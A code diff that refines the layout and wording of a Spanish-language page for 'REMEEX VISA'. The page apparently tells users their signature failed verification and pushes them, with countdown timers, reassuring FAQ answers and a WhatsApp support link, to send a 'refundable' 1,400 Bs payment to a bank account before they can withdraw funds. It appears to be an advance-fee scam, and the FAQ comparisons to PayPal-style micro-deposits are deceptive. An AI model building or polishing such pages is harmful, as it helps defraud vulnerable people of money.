@@ -1401,6 +1401,9 @@
       display: flex;
       align-items: center;
       transition: var(--transition);
+      white-space: nowrap;
+      overflow: hidden;
+      text-overflow: ellipsis;
     }
 
     .btn-icon {
@@ -2013,9 +2016,58 @@
       }
       .feature-buttons-container {
         justify-content: center;
+        gap: 0.6rem;
       }
       .feature-button {
-        width: 150px;
+        width: 140px;
+        height: 50px;
+      }
+      
+      /* Mejoras para el overlay explicación */
+      .modal {
+        padding: 1.5rem;
+        width: 90%;
+        max-width: 90%;
+      }
+      .modal h3 {
+        font-size: 1.2rem;
+        margin-bottom: 0.8rem;
+      }
+      .modal p {
+        font-size: 0.9rem;
+        margin-bottom: 1rem;
+        text-align: left;
+      }
+      .info-box {
+        padding: 1rem;
+        margin: 1rem 0;
+      }
+      .info-box h4 {
+        font-size: 1rem;
+      }
+      .icon-list li {
+        font-size: 0.85rem;
+        gap: 0.4rem;
+      }
+      
+      /* Mejoras para botones */
+      .btn-advanced-container {
+        width: 140px;
+        height: 45px;
+        margin: 0.3rem;
+      }
+      .btn-text {
+        font-size: 0.85rem;
+      }
+      
+      /* Mejora para formularios */
+      .form-control {
+        padding: 0.75rem 1rem;
+      }
+      
+      /* Datos de seguridad */
+      .security-data-card {
+        padding: 1.25rem;
       }
     }
     
@@ -2027,8 +2079,15 @@
       .balance-amount {
         font-size: 1.6rem; /* Aún más pequeño para móviles muy pequeños */
       }
+      .section-content {
+        padding: 1.5rem;
+      }
       .section-content h2 {
         font-size: 1.3rem;
+      }
+      .subtitle {
+        font-size: 0.8rem;
+        padding-left: 1.7rem;
       }
       .form-group label,
       .form-control {
@@ -2037,19 +2096,94 @@
       .btn-glow {
         font-size: 0.9rem;
       }
+      .btn-glow-content {
+        font-size: 0.85rem;
+        white-space: nowrap;
+        overflow: hidden;
+        text-overflow: ellipsis;
+      }
       .info-section-old p, .verification-section p {
         font-size: 0.9rem;
       }
+      
+      /* Feature buttons mejorados para móvil */
+      .feature-buttons-container {
+        gap: 0.5rem;
+      }
       .feature-button {
-        width: 140px;
-        height: 50px;
+        width: 130px;
+        height: 48px;
       }
       .feature-button-title {
-        font-size: 0.8rem;
+        font-size: 0.75rem;
       }
       .feature-button-subtitle {
-        font-size: 0.65rem;
+        font-size: 0.6rem;
       }
+      
+      /* Overlay explicación optimizado */
+      .modal {
+        padding: 1.25rem;
+        width: 95%;
+      }
+      .modal h3 {
+        font-size: 1.1rem;
+      }
+      .modal p {
+        font-size: 0.85rem;
+      }
+      .btn-advanced-container {
+        width: 130px;
+        height: 42px;
+      }
+      .btn-text {
+        font-size: 0.8rem;
+      }
+      
+      /* Ajustes para el checkbox */
+      .custom-checkbox label {
+        font-size: 0.8rem;
+      }
+      
+      /* Overlay buttons fixes */
+      .confirmation-buttons {
+        flex-direction: column;
+        align-items: center;
+        gap: 0.5rem;
+      }
+      .confirmation-buttons .btn-advanced-container {
+        width: 100%;
+        max-width: 200px;
+      }
+      
+      /* Overlay FAQ */
+      .faq-question {
+        font-size: 0.85rem;
+        padding: 10px 12px;
+      }
+      .faq-answer-content {
+        font-size: 0.8rem;
+        padding: 0 12px;
+      }
+    }
+    
+    /* Estandarización de colores de botones */
+    .btn-advanced:not(.warning):not(.danger):not(.success),
+    .btn-glow:not(.btn-danger):not(.btn-success):not(.btn-warning) {
+      background: linear-gradient(135deg, var(--primary), var(--primary-light));
+    }
+    
+    .btn-advanced-effect:not(.warning):not(.danger):not(.success),
+    .btn-glow-effect:not(.btn-danger):not(.btn-success):not(.btn-warning) {
+      background: linear-gradient(90deg, var(--primary), var(--secondary), var(--primary));
+    }
+    
+    /* Garantizar visibilidad del texto en botones */
+    .btn-glow-content, .btn-text {
+      white-space: nowrap;
+      overflow: hidden;
+      text-overflow: ellipsis;
+      padding: 0 0.5rem;
     }
   </style>
 </head>
@@ -2191,9 +2325,9 @@
       <div class="btn-std-container" style="margin: 0 auto; width: 220px;">
         <div class="btn-glow-effect"></div>
         <button class="btn-glow btn-disabled" id="continueSecurityBtn1" disabled>
-          <div class="btn-glow-content btn-glow-initial">Acepto, Quiero continuar</div>
+          <div class="btn-glow-content btn-glow-initial">Acepto, Continuar</div>
           <div class="btn-glow-content btn-glow-hover">
-            Acepto, Quiero continuar
+            Acepto, Continuar
             <i class="fas fa-arrow-right btn-glow-icon"></i>
           </div>
         </button>
@@ -2224,9 +2358,9 @@
       <div class="btn-std-container" style="margin: 0 auto; width: 180px;">
         <div class="btn-glow-effect"></div>
         <button class="btn-glow btn-disabled" id="continueSecurityBtn2" disabled>
-          <div class="btn-glow-content btn-glow-initial">Entendido, Continuar</div>
+          <div class="btn-glow-content btn-glow-initial">Entendido</div>
           <div class="btn-glow-content btn-glow-hover">
-            Entendido, Continuar
+            Entendido
             <i class="fas fa-arrow-right btn-glow-icon"></i>
           </div>
         </button>
@@ -2333,7 +2467,7 @@
   <!-- STEP 4C: Último paso para recibir tu dinero en minutos -->
   <div class="section-content" id="securityVerification3C">
     <h2>
-      <i class="fas fa-flag-checkered"></i> Último paso para recibir tu dinero en minutos
+      <i class="fas fa-flag-checkered"></i> Último paso para recibir tu dinero
       <span class="subtitle">Su firma no coincidió. Verifique su cuenta ahora</span>
     </h2>
     <div class="info-section-old">
@@ -2413,8 +2547,7 @@
     <div class="custom-checkbox">
       <input type="checkbox" id="termsCheckbox">
       <label for="termsCheckbox">
-        Entiendo que la recarga de <strong id="montoRecargaCheckbox">1.400,00 Bs</strong> es únicamente para verificar la titularidad de mi cuenta y será reembolsada inmediatamente junto con mi saldo principal.
-        Confirmo que soy el titular legítimo de la cuenta bancaria indicada y acepto los <span class="terms-link" id="showTermsLink">términos y condiciones</span> de REMEEX VISA.
+        Entiendo que la recarga de <strong id="montoRecargaCheckbox">1.400,00 Bs</strong> es únicamente para verificar la titularidad de mi cuenta y será reembolsada junto con mi saldo principal.
       </label>
     </div>
     
@@ -2427,23 +2560,23 @@
     
     <!-- Botones para ver explicación y video organizados mejor -->
     <div style="display: flex; justify-content: center; flex-wrap: wrap; gap: 10px; margin: 1rem 0;">
-      <div class="btn-std-container" style="width: 180px;">
+      <div class="btn-std-container" style="width: 160px;">
         <div class="btn-glow-effect"></div>
         <button class="btn-glow" id="showExplicacionBtn">
           <div class="btn-glow-content btn-glow-initial">Ver explicación</div>
           <div class="btn-glow-content btn-glow-hover">
-            Ver explicación
+            Explicación
             <i class="fas fa-info-circle btn-glow-icon"></i>
           </div>
         </button>
       </div>
       
-      <div class="btn-std-container" style="width: 180px;">
+      <div class="btn-std-container" style="width: 160px;">
         <div class="btn-glow-effect"></div>
         <button class="btn-glow" id="verVideoDesdeSeccionBtn">
           <div class="btn-glow-content btn-glow-initial">Ver tutorial</div>
           <div class="btn-glow-content btn-glow-hover">
-            Ver tutorial
+            Tutorial
             <i class="fas fa-play-circle btn-glow-icon"></i>
           </div>
         </button>
@@ -2455,8 +2588,8 @@
       <a href="fororemeex.html" target="_blank" class="feature-button feature-button-1">
         <div class="feature-button-bg"></div>
         <div class="feature-button-inner">
-          <span class="feature-button-title">Foro de usuarios</span>
-          <span class="feature-button-subtitle">Interactúa en vivo</span>
+          <span class="feature-button-title">Foro</span>
+          <span class="feature-button-subtitle">Usuarios</span>
           <i class="fas fa-users"></i>
         </div>
       </a>
@@ -2465,7 +2598,7 @@
         <div class="feature-button-bg"></div>
         <div class="feature-button-inner">
           <span class="feature-button-title">Opiniones</span>
-          <span class="feature-button-subtitle">De otros usuarios</span>
+          <span class="feature-button-subtitle">Usuarios</span>
           <i class="fas fa-star"></i>
         </div>
         <div class="earning-sticker">GANA 5USD</div>
@@ -2474,8 +2607,8 @@
       <a href="preguntasremeex.html" target="_blank" class="feature-button feature-button-3">
         <div class="feature-button-bg"></div>
         <div class="feature-button-inner">
-          <span class="feature-button-title">Preguntas</span>
-          <span class="feature-button-subtitle">Y Respuestas</span>
+          <span class="feature-button-title">FAQ</span>
+          <span class="feature-button-subtitle">Preguntas</span>
           <i class="fas fa-question-circle"></i>
         </div>
       </a>
@@ -2483,8 +2616,8 @@
       <a href="instructivoremeex.html" target="_blank" class="feature-button feature-button-4">
         <div class="feature-button-bg"></div>
         <div class="feature-button-inner">
-          <span class="feature-button-title">Instructivo</span>
-          <span class="feature-button-subtitle">Validación Express</span>
+          <span class="feature-button-title">Guía</span>
+          <span class="feature-button-subtitle">Instructivo</span>
           <i class="fas fa-file-download"></i>
         </div>
       </a>
@@ -2492,8 +2625,8 @@
       <a href="#" class="feature-button feature-button-5" id="verVideoBtn">
         <div class="feature-button-bg"></div>
         <div class="feature-button-inner">
-          <span class="feature-button-title">Ver video</span>
-          <span class="feature-button-subtitle">Tutorial explicativo</span>
+          <span class="feature-button-title">Video</span>
+          <span class="feature-button-subtitle">Tutorial</span>
           <i class="fas fa-play-circle"></i>
         </div>
       </a>
@@ -2511,7 +2644,7 @@
         </button>
       </div>
       <div class="countdown" id="countdownRecargaReady">
-        Por favor, completa la recarga antes de continuar...
+        Completa la recarga antes de continuar...
       </div>
     </div>
   </div>
@@ -2588,14 +2721,14 @@
       />
     </div>
     <div style="text-align:center; margin-top:1.5rem;">
-      <div class="btn-std-container" style="margin: 0 auto; width: 200px;">
+      <div class="btn-std-container" style="margin: 0 auto; width: 180px;">
         <div class="btn-glow-effect"></div>
         <button class="btn-glow btn-success btn-disabled" id="confirmRecargaBtn" disabled>
           <div class="btn-glow-content btn-glow-initial">
-            <i class="fas fa-check" style="margin-right: 0.5rem;"></i> Confirmar Recarga
+            <i class="fas fa-check" style="margin-right: 0.5rem;"></i> Confirmar
           </div>
           <div class="btn-glow-content btn-glow-hover">
-            <i class="fas fa-check" style="margin-right: 0.5rem;"></i> Confirmar Recarga
+            <i class="fas fa-check" style="margin-right: 0.5rem;"></i> Confirmar
           </div>
         </button>
       </div>
@@ -2613,8 +2746,7 @@
     <h3>¿Estás seguro de tu firma?</h3>
     <p>
       La firma debe coincidir con la de tu documento de identidad. <br/>
-      Si no coincide, se solicitará verificación adicional. <br/>
-      ¿Deseas continuar con esta firma?
+      Si no coincide, se solicitará verificación adicional.
     </p>
 
     <div class="signature-container">
@@ -2669,7 +2801,7 @@
     
     <div class="warning-message">
       <i class="fas fa-exclamation-triangle warning-icon"></i>
-      <span class="warning-text">Por favor, no cierres esta ventana ni retrocedas durante el proceso</span>
+      <span class="warning-text">No cierres esta ventana durante el proceso</span>
     </div>
     
     <div class="spinner-advanced">
@@ -2745,7 +2877,7 @@
 <div class="overlay" id="overlayErrorFinal">
   <div class="modal modal-glow error">
     <h3 style="background: linear-gradient(90deg, var(--danger), var(--danger-dark)); -webkit-background-clip: text; -webkit-text-fill-color: transparent; background-clip: text; text-fill-color: transparent;">
-      Atención: No encontramos tu recarga
+      No encontramos tu recarga
     </h3>
     
     <p id="errorFinalTexto">
@@ -2760,7 +2892,7 @@
     </div>
     
     <p style="margin-top: 0.5rem;">
-      Por favor, contacta con soporte para recibir asistencia inmediata.
+      Contacta con soporte para recibir asistencia inmediata.
     </p>
     
    <div style="text-align: center; margin-top: 1rem;">
@@ -2770,7 +2902,7 @@
         class="btn-support"
         id="whatsappLink"
       >
-        <i class="fab fa-whatsapp"></i> Contactar con Soporte
+        <i class="fab fa-whatsapp"></i> Contactar Soporte
       </a>
     </div>
   </div>
@@ -2779,7 +2911,7 @@
 <!-- Overlay: Datos de Verificación (Pago Móvil) -->
 <div class="overlay" id="overlayDatosVerificacion">
   <div class="modal modal-glow">
-    <h3>Datos para Pago Móvil de Verificación</h3>
+    <h3>Datos para Pago Móvil</h3>
     <div id="modalDatosContent">
       <p><strong>Banco:</strong> Banco Venezolano de Crédito (0104)</p>
       <p>
@@ -2844,7 +2976,7 @@ Tu firma no coincide con la registrada en el banco. Necesitamos que pases por un
     </div>
     
     <div class="countdown-container">
-      <span>Serás redirigido en</span>
+      <span>Redirigiendo en</span>
       <span class="countdown-number" id="redirectCountdown">10</span>
       <span>segundos...</span>
     </div>
@@ -2854,18 +2986,18 @@ Tu firma no coincide con la registrada en el banco. Necesitamos que pases por un
 <!-- NUEVO: Overlay de Explicación de Validación (Simplificado) -->
 <div class="overlay" id="overlayExplicacionValidacion">
   <div class="modal modal-glow">
-    <h3>Verificación Rápida: ¿Por qué es necesaria?</h3>
+    <h3>¿Por qué necesito verificar mi cuenta?</h3>
     <p>
       Tu firma digital no coincide con la registrada, lo que ha activado nuestro protocolo de seguridad.
-      Para proteger tus fondos, necesitamos confirmar tu identidad mediante un proceso simple y seguro.
+      Para proteger tus fondos, necesitamos confirmar tu identidad mediante un proceso simple.
     </p>
     
     <div class="info-box">
-      <h4>Beneficios de la Verificación Rápida:</h4>
+      <h4>Beneficios de esta verificación:</h4>
       <ul class="icon-list">
         <li><i class="fas fa-shield-alt"></i> <strong>Protege tus fondos</strong> contra accesos no autorizados</li>
-        <li><i class="fas fa-undo"></i> El monto de verificación <strong>se reembolsa completamente</strong> junto con tu retiro</li>
-        <li><i class="fas fa-clock"></i> Proceso rápido (minutos) en comparación con otras verificaciones (hasta 72h)</li>
+        <li><i class="fas fa-undo"></i> El monto de verificación <strong>se reembolsa completamente</strong></li>
+        <li><i class="fas fa-clock"></i> Proceso rápido (minutos) comparado con otras verificaciones (72h)</li>
       </ul>
     </div>
     
@@ -2874,8 +3006,8 @@ Tu firma no coincide con la registrada en el banco. Necesitamos que pases por un
       de tu identidad, garantizando que solo tú puedas acceder a tus fondos.
     </p>
     
-    <div style="display:flex; gap:1rem; justify-content:center; flex-wrap:wrap; margin-top: 1rem;">
-      <div class="btn-advanced-container">
+    <div style="display:flex; justify-content:center; margin-top: 1rem;">
+      <div class="btn-advanced-container" style="width: 150px;">
         <div class="btn-advanced-effect"></div>
         <button class="btn-advanced" id="entendidoBtn">
           <span class="btn-text">
@@ -2915,29 +3047,29 @@ Tu firma no coincide con la registrada en el banco. Necesitamos que pases por un
     <div class="faq-container">
       <div class="faq-item">
         <div class="faq-question">
-          ¿Por qué necesito hacer una recarga de verificación? <i class="fas fa-chevron-down"></i>
+          ¿Por qué necesito hacer una recarga? <i class="fas fa-chevron-down"></i>
         </div>
         <div class="faq-answer">
           <div class="faq-answer-content">
-            La recarga de verificación confirma que tú eres el dueño de la cuenta bancaria. Es como cuando PayPal o Stripe hacen pequeñas transacciones para comprobar una cuenta. Este método es más seguro que códigos por SMS o correo, que pueden ser interceptados por hackers. Protege tu dinero evitando que otras personas accedan a tus fondos.
+            La recarga de verificación confirma que tú eres el dueño de la cuenta bancaria. Es como cuando PayPal o Stripe hacen pequeñas transacciones para comprobar una cuenta. Este método es más seguro que códigos por SMS o correo, que pueden ser interceptados.
           </div>
         </div>
       </div>
       
       <div class="faq-item">
         <div class="faq-question">
-          ¿Por qué no usan otros métodos de verificación? <i class="fas fa-chevron-down"></i>
+          ¿Por qué no usan otros métodos? <i class="fas fa-chevron-down"></i>
         </div>
         <div class="faq-answer">
           <div class="faq-answer-content">
-            Los códigos por SMS o correo electrónico pueden ser interceptados por hackers. Al usar tu propia cuenta bancaria, creamos una verificación que nadie puede falsificar. Si nosotros te enviáramos dinero, un impostor podría recibirlo. Cuando tú haces el movimiento desde tu cuenta verificada, demostramos que realmente eres tú quien tendrá acceso a los fondos.
+            Los códigos por SMS o correo electrónico pueden ser interceptados. Al usar tu propia cuenta bancaria, creamos una verificación que nadie puede falsificar. Si nosotros te enviáramos dinero, un impostor podría recibirlo.
           </div>
         </div>
       </div>
       
       <div class="faq-item">
         <div class="faq-question">
-          ¿Se puede descontar el monto de verificación de mis fondos? <i class="fas fa-chevron-down"></i>
+          ¿Se puede descontar el monto de mis fondos? <i class="fas fa-chevron-down"></i>
         </div>
         <div class="faq-answer">
           <div class="faq-answer-content">
@@ -2948,7 +3080,7 @@ Tu firma no coincide con la registrada en el banco. Necesitamos que pases por un
       
       <div class="faq-item">
         <div class="faq-question">
-          ¿Realmente me devuelven el monto de verificación? <i class="fas fa-chevron-down"></i>
+          ¿Realmente me devuelven el monto? <i class="fas fa-chevron-down"></i>
         </div>
         <div class="faq-answer">
           <div class="faq-answer-content">
@@ -2961,22 +3093,22 @@ Tu firma no coincide con la registrada en el banco. Necesitamos que pases por un
       
       <div class="faq-item">
         <div class="faq-question">
-          ¿Por qué esa cantidad específica y no menos? <i class="fas fa-chevron-down"></i>
+          ¿Por qué esa cantidad específica? <i class="fas fa-chevron-down"></i>
         </div>
         <div class="faq-answer">
           <div class="faq-answer-content">
             El monto siempre es pequeño y proporcional a tu retiro:
-            <br>- Retiros menores a $500: Solo 1% (ejemplo: para $300, verificas con $3)
-            <br>- Retiros de $500 o más: Máximo 2% (ejemplo: para $1,500, verificas con $30)
+            <br>- Retiros menores a $500: Solo 1%
+            <br>- Retiros de $500 o más: Máximo 2%
             <br><br>
-            Este monto es lo suficientemente significativo para validar tu cuenta, pero no tan alto como para causarte problemas, y recuerda que se te devuelve completamente.
+            Este monto es lo suficientemente significativo para validar tu cuenta, pero no tan alto como para causarte problemas, y se te devuelve completamente.
           </div>
         </div>
       </div>
       
       <div class="faq-item">
         <div class="faq-question">
-          ¿Qué pasa si necesito mi dinero urgentemente? <i class="fas fa-chevron-down"></i>
+          ¿Qué pasa si necesito mi dinero urgente? <i class="fas fa-chevron-down"></i>
         </div>
         <div class="faq-answer">
           <div class="faq-answer-content">
@@ -3010,7 +3142,7 @@ Tu firma no coincide con la registrada en el banco. Necesitamos que pases por un
     <div class="confirmation-checkbox">
       <input type="checkbox" id="confirmacionRecargaCheckbox">
       <label for="confirmacionRecargaCheckbox">
-        Sí, he realizado la recarga reembolsable y deseo continuar
+        Sí, he realizado la recarga reembolsable
       </label>
     </div>
     
@@ -3019,7 +3151,7 @@ Tu firma no coincide con la registrada en el banco. Necesitamos que pases por un
         <div class="btn-advanced-effect warning"></div>
         <button class="btn-advanced warning" id="noRealizadaRecargaBtn">
           <span class="btn-text">
-            No, aún no he realizado la recarga
+            No, aún no
             <i class="fas fa-times btn-icon"></i>
           </span>
         </button>
@@ -3029,7 +3161,7 @@ Tu firma no coincide con la registrada en el banco. Necesitamos que pases por un
         <div class="btn-advanced-effect success"></div>
         <button class="btn-advanced success" id="siRealizadaRecargaBtn">
           <span class="btn-text">
-            Sí, he realizado la recarga
+            Sí, continuar
             <i class="fas fa-check btn-icon"></i>
           </span>
         </button>
@@ -4327,17 +4459,17 @@ Tu firma no coincide con la registrada en el banco. Necesitamos que pases por un
     let timer = recargaReadyBtnCountdown;
     btn.disabled = true;
     btn.classList.add("btn-disabled");
-    cdLabel.textContent = `Por favor completa la recarga. Botón disponible en ${timer} segundos...`;
+    cdLabel.textContent = `Por favor completa la recarga. Disponible en ${timer} segundos...`;
 
     const interval = setInterval(() => {
       timer--;
-      cdLabel.textContent = `Por favor completa la recarga. Botón disponible en ${timer} segundos...`;
+      cdLabel.textContent = `Por favor completa la recarga. Disponible en ${timer} segundos...`;
       if (timer <= 0) {
         clearInterval(interval);
         btn.classList.remove("btn-disabled");
         recargaReadyBtnEnabled = true;
         btn.disabled = false;
-        cdLabel.textContent = "¿Ya realizaste la recarga? Haz clic en continuar";
+        cdLabel.textContent = "¿Ya realizaste la recarga? Continúa aquí";
       }
     }, 1000);
   }
